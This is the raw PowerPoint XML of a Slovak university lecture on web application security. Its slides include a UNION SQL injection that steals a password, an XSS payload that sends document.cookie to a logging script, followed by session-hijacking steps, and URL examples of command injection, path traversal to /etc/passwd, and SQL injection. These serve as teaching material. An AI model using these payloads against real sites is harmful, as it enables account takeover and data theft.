        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2323103832" sldId="322"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:32:57.111" v="401" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2323103832" sldId="322"/>
            <ac:spMk id="2" creationId="{CB7ED8FA-2F8B-665C-21B5-4F06C6E49B33}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:35:00.101" v="407" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2323103832" sldId="322"/>
            <ac:spMk id="5" creationId="{2E6C17CE-2F2B-DC46-9543-875CC231D4A8}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:34:49.817" v="402" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2323103832" sldId="322"/>
            <ac:spMk id="6" creationId="{B3FA9B64-EA50-24D0-BDB6-78E0A32C63DB}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:34:55.552" v="406" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2323103832" sldId="322"/>
            <ac:picMk id="8" creationId="{5802AED7-7425-192C-9FE5-3236F182A463}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod ord">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:38:20.482" v="485" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1113170726" sldId="323"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:35:38.383" v="481" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1113170726" sldId="323"/>
            <ac:spMk id="2" creationId="{110AEC85-975B-3330-F3E4-0A2A1F7707A2}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:38:12.168" v="482" actId="478"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1113170726" sldId="323"/>
            <ac:spMk id="5" creationId="{F7FB5CAD-F4A8-8199-8886-FEED5BB16398}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="add mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:38:20.482" v="485" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1113170726" sldId="323"/>
            <ac:spMk id="6" creationId="{8B4DCE7E-9619-58BE-4C9D-27E502588533}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:41:20.124" v="917" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3974695761" sldId="324"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:35:34.352" v="479" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3974695761" sldId="324"/>
            <ac:spMk id="2" creationId="{968C4956-E369-626E-8F6E-4F647A7F4EEC}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:41:20.124" v="917" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3974695761" sldId="324"/>
            <ac:spMk id="3" creationId="{D7D181B2-7511-457C-4FBA-E46E00118427}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:42:36.544" v="1055" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1370085235" sldId="325"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:41:30.445" v="919"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1370085235" sldId="325"/>
            <ac:spMk id="2" creationId="{A4ED7FAA-0F9D-3344-CC11-2D3EAC2F05D8}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Michal Ďuračík" userId="cf2726a1-d5ba-4ec7-91ee-a3b1c496c4d0" providerId="ADAL" clId="{00F9A5C0-E7EB-44F9-B573-98D6DE958595}" dt="2025-11-25T14:42:36.544" v="1055" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1370085235" sldId="325"/>
            <ac:spMk id="3" creationId="{C32ECC6C-CD7A-10B4-4610-E28396F5CC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c4d0b4c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9c4d0b4cd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bdbf601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bdbf601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3bdbf601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13bdbf601a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a1bd1bdf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a1bd1bdf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a1bd1bdf8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a1bd1bdf8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a1bd1bdf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a1bd1bdf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a1bd1bdf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a1bd1bdf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a1bd1bdf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a1bd1bdf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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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sk-SK" sz="1100" noProof="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Kompl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>etný</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> SQL príkaz vyzerá nasledovne:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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139700" indent="0">
              <a:buNone/>
            </a:pP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SELECT id, lo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g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in, password FROM users WHERE login='xxx' UNION SELECT id, lo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g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in, (SELECT password FROM users WHERE login='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Fero</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>') AS password FROM users WHERE login='Peter'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634561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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8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GB" dirty="0"/>
              <a:t>&lt;script&gt;fetch("http://localhost/hocico.php?"+document.cookie)&lt;/script&gt; do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>príspevku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sk-SK" dirty="0"/>
              <a:t>Skontrolovať metódu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>setText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>() v triede Post, r. 61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  <a:tabLst/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Skontrolovať pohľad </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Views</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Posts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>index.view.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, r. 26 </a:t>
            </a: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&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CF8E6D"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>php</a:t>
            </a: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 echo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9876AA"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>$post</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BCBEC4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="57AAF7"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>getText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BCBEC4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>() </a:t>
            </a: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?&gt;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  <a:tabLst/>
              <a:defRPr/>
            </a:pP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Pozrieť do logu web servera v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CF8E6D"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>docker</a:t>
            </a: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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CF8E6D"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>stack</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CF8E6D"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono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  <a:tabLst/>
              <a:defRPr/>
            </a:pP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Skopírovať hodnotu PHPSESSIONID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  <a:tabLst/>
              <a:defRPr/>
            </a:pP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Otvoriť nové súkromné okno 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  <a:tabLst/>
              <a:defRPr/>
            </a:pP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Zmeniť </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CF8E6D"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>cookies</a:t>
            </a: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 PHPSESSIONID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  <a:tabLst/>
              <a:defRPr/>
            </a:pP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A sme p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CF8E6D"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>rihlasen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CF8E6D"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>í </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CF8E6D"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" sz="1800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CF8E6D"/>
              </a:solidFill>
              <a:latin typeface="JetBrains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-SK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a1bd1bdf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a1bd1bdf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a35e90af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a35e90af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a1bd1bdf8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a1bd1bdf8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a1bd1bdf8_1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a1bd1bdf8_1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a1bd1bdf8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a1bd1bdf8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a1ed8a4ed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a1ed8a4ed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a35e90afa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a35e90afa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a35e90af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a35e90af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a1ed8a4e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a1ed8a4e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75c9fd49c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75c9fd49c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a1ed8a4ed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a1ed8a4ed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a1ed8a4ed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a1ed8a4ed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a1ed8a4e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1a1ed8a4e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a1ed8a4ed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a1ed8a4ed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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>í</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>klad</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> http://www.medium.com 	</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2623308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Úvodná snímka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334900" y="2314324"/>
            <a:ext cx="8447100" cy="247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35893" y="765323"/>
            <a:ext cx="8245200" cy="11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35895" y="1871584"/>
            <a:ext cx="8245200" cy="4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6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0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="lt1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3000"/>
              <a:buFont typeface="Cabin"/>
              <a:buNone/>
              <a:defRPr sz="30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○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■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●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○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■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0225" y="4726000"/>
            <a:ext cx="1563300" cy="3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lavička sekci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35863" y="3856480"/>
            <a:ext cx="84681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27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4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4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435895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1313" y="1671002"/>
            <a:ext cx="40668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anie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334486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35895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65414" y="1688169"/>
            <a:ext cx="3815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35895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892801" y="1688169"/>
            <a:ext cx="3815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457200" marR="0" lvl="0" indent="-2286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5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4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1200" b="1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63282" y="2194539"/>
            <a:ext cx="40449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ok s popisom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435895" y="3520042"/>
            <a:ext cx="82722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bin"/>
              <a:buNone/>
              <a:defRPr sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:schemeClr val="accen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7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="335863" y="449794"/>
            <a:ext cx="8468100" cy="26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ct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435894" y="3945095"/>
            <a:ext cx="8272200" cy="4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l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n nadpis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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="330512" y="454916"/>
            <a:ext cx="8475000" cy="944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431920" y="547244"/>
            <a:ext cx="8272200" cy="7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a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sah s popisom" type="objTx">
  <p:cSld name="OBJECT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335863" y="3856480"/>
            <a:ext cx="8473500" cy="956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435894" y="3946722"/>
            <a:ext cx="36822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1100"/>
              <a:buFont typeface="Cabin"/>
              <a:buNone/>
              <a:defRPr sz="15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◼"/>
              <a:defRPr sz="15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048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921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228600" algn="r" rtl="0"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8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8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286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286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7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zvislý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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="330214" y="460805"/>
            <a:ext cx="8481900" cy="89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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3250956" y="-1063048"/>
            <a:ext cx="2642100" cy="82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vislý nadpis a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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629401" y="449794"/>
            <a:ext cx="2180100" cy="4362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5437324" y="1698994"/>
            <a:ext cx="3887400" cy="15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1598552" y="-510656"/>
            <a:ext cx="3887400" cy="5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>
            <a:off x="6745254" y="4467103"/>
            <a:ext cx="996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>
            <a:off x="581192" y="4463858"/>
            <a:ext cx="5922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7834961" y="4467103"/>
            <a:ext cx="87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rgbClr val="2D58AC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lvl="0" indent="-304800" rtl="0">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1200"/>
              <a:buChar char="◼"/>
              <a:defRPr/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="914400" lvl="1" indent="-298450" rtl="0">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="◼"/>
              <a:defRPr/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Char char="◼"/>
              <a:defRPr/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Char char="◼"/>
              <a:defRPr/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="4114800" lvl="8" indent="-279400" rtl="0">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPts val="800"/>
              <a:buChar char="◼"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5" name="Google Shape;95;p13" descr="logo_azet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036" y="4765296"/>
            <a:ext cx="548700" cy="20902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897350" y="4749928"/>
            <a:ext cx="7734900" cy="9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147CC1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>číslo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1000" b="1">
                <a:solidFill>
                  <a:srgbClr val="147CC1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1000">
                <a:solidFill>
                  <a:srgbClr val="147CC1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> na slovenskom internete</a:t>
            </a:r>
            <a:endParaRPr sz="1000">
              <a:solidFill>
                <a:srgbClr val="147CC1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="97" name="Google Shape;97;p13" descr="azet-logo-ringier-axel-spring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3051" y="4779825"/>
            <a:ext cx="675500" cy="3110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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="445200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6EBE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2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="-37350"/>
            <a:ext cx="7735200" cy="5199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35894" y="528843"/>
            <a:ext cx="8272200" cy="8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abin"/>
              <a:buNone/>
              <a:defRPr sz="2100" b="0" i="0" u="none" strike="noStrike" cap="none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5894" y="1752002"/>
            <a:ext cx="8272200" cy="26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457200" marR="0" lvl="0" indent="-3048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29845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2921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◼"/>
              <a:defRPr sz="11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279400" algn="l" rtl="0"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279400" algn="l" rtl="0"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Char char="◼"/>
              <a:defRPr sz="900" b="0" i="0" u="none" strike="noStrike" cap="none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704463" y="446710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35894" y="4463858"/>
            <a:ext cx="518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334900" y="342900"/>
            <a:ext cx="2777400" cy="7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6031610" y="340232"/>
            <a:ext cx="2777400" cy="73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3181373" y="342900"/>
            <a:ext cx="2777400" cy="68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abc.sk/cgi-bin/odozva?server=localhos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://abc.sk/cgi-bin/odozva?server=localhost;ls%20-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abc.sk/cgi-bin/vypis?subor=abc.tx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bc.sk/cgi-bin/vypis?subor=../../etc/passw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abc.sk/cgi-bin/db.php?ID=125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http://abc.sk/cgi-bin/db.php?ID=1254+or+id%3C%3E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cs.wikipedia.org/wiki/Cross-site_script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hyperlink" Target="https://xss.js.org/#/xss01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security_problems/xss1.html?meno=%3cscript%3ealert('Toto%20je%20XSS%20&#250;tok!')%3c/script%3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security_problems/xss2.php?meno=%3cscript%3ealert('Toto%20je%20XSS%20&#250;tok!')%3c/script%3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ession_fixation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drojak.cz/clanky/kradeni-session-id-pomoci-phpinfo-a-jak-tomu-zabranit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Cross-site_request_forger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drojak.cz/clanky/co-je-cross-site-request-forgery-a-jak-se-branit/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swisskyrepo.github.io/PayloadsAllTheThings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neal.fun/password-game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hyperlink" Target="https://www.fri.uniza.sk/cms/quizzes/questions/qr/31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p.net/manual/en/faq.passwords.php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unetix.com/blog/web-security-zone/what-is-poodle-attack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pbn.co/transport-layer-security-tls/" TargetMode="Externa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i.uniza.sk/cms/quizzes/questions/qr/32" TargetMode="Externa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Digest_access_authentication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jwt.io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MAC" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://tools.ietf.org/html/rfc7519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jwt.io/#debugger-io" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Base64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ttribute-based_access_control" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Access-control_lis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Role-based_access_control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anami.com/how-rbac-is-different-from-abac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anami.com/how-rbac-is-different-from-abac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i.uniza.sk/cms/quizzes/questions/qr/33" TargetMode="External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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="345300" y="550077"/>
            <a:ext cx="8245200" cy="1289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Bezpečnosť webových aplikácií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/>
          </a:p>
        </p:txBody>
      </p:sp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2858" y="1839575"/>
            <a:ext cx="2252267" cy="44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6942425" y="2656175"/>
            <a:ext cx="1240500" cy="14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sz="6000" dirty="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10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Google Shape;98;p13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6C5B0D1-8558-CAB0-DAB0-A1D2B5AA73F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3810726"/>
            <a:ext cx="2374325" cy="942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>
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>doc. Ing. Patrik Hrkút,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>
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ing. Matej </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Meško</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, PhD.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ing. Michal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ďuračík</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, PhD.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sk-SK" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Google Shape;96;p13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8C27-ED93-24FF-DC62-0865F13B005B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="345299" y="1036977"/>
            <a:ext cx="8429825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accent2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342900" marR="0" lvl="1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12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685800" marR="0" lvl="2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1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028700" marR="0" lvl="3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1371600" marR="0" lvl="4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1714500" marR="0" lvl="5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2057400" marR="0" lvl="6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2400300" marR="0" lvl="7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2743200" marR="0" lvl="8" indent="0" algn="ctr" rtl="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accent2"/>
              </a:buClr>
              <a:buSzPts val="800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
              <a:defRPr sz="900" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="888888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pPr>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>6UI0012 Vývoj aplikácií pre internet a intranet				                          šk. rok 2025/26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335862" y="450900"/>
            <a:ext cx="8469600" cy="31536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228600" lvl="0" indent="-13970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sk-SK" sz="2400" dirty="0"/>
              <a:t>Obsah prednášky:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-139700" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="sk-SK" sz="1800" dirty="0"/>
          </a:p>
